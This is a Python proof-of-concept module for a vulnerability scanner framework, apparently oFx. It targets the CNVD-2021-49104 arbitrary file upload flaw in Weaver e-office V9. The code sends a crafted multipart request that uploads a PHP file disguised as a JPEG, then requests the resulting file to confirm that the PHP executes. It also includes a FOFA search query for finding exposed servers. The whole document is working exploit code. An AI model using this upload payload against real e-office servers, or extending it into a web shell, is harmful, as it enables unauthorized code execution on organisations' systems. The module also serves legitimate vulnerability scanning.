# coding:utf-8  
import requests
from lib.core.common import url_handle,get_random_ua,random_str
from lib.core.poc import POCBase
# ...
import urllib3
urllib3.disable_warnings()

class POC(POCBase):

    _info = {
        "author" : "jijue",                      # POC作者
        "version" : "1",                    # POC版本，默认是1  
        "CreateDate" : "2021-06-09",        # POC创建时间
        "UpdateDate" : "2021-06-09",        # POC创建时间
        "PocDesc" : """
            略  
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "泛微OA E-Office V9文件上传漏洞(CNVD-2021-49104)",                        # 漏洞名称
        "VulnID" : "oFx-2021-0001",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName" : "泛微OA E-Office",                     # 漏洞应用名称
        "AppVersion" : "E-Office V9",                  # 漏洞应用版本
        "VulnDate" : "2021-06-09",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc" : """
            泛微e-office是泛微旗下的一款标准协同移动办公平台。
            由于 e-office 未能正确处理上传模块中的用户输入，攻击者可以通过该漏洞构造恶意的上传数据包，最终实现任意代码执行。
        """,                                # 漏洞简要描述

        "fofa-dork":"""
            app="泛微-EOffice"
        """,                     # fofa搜索语句
        "example" : "",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False,""]
        url0 = self.target + "/general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId=" # url自己按需调整
        url1 = self.target+"/images/logo/logo-eoffice.php"

        flag = random_str()

        headers = {"Host":"",
            "User-Agent":get_random_ua(),
                    "Connection":"close",
                    'Content-Type': 'multipart/form-data; boundary=f99b1021cc5269dcca9fbb0012f3663d'
                    }
        data = """
--f99b1021cc5269dcca9fbb0012f3663d
Content-Disposition: form-data; name="Filedata"; filename="cmd.php"
Content-Type: image/jpeg

<?php 
echo "{flag}";
?>
--f99b1021cc5269dcca9fbb0012f3663d--
""".format(flag=flag)
        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            req0 = requests.post(url0,data=data,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
            if req0.status_code == 200 and "logo-eoffice.php" in req0.text:
                req1 = requests.get(url1, proxies = self.proxy ,timeout = self.timeout,verify = False)
                if req1.status_code == 200 and flag in req1.text:
                # if req1.status_code == 200 and flag in req1.text:
                    vuln = [True,req1.text]
            else:
                vuln = [False,req0.text]
        except Exception as e:
            raise e
        
        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False
        
        return vuln

    def _attack(self):
        return self._verify()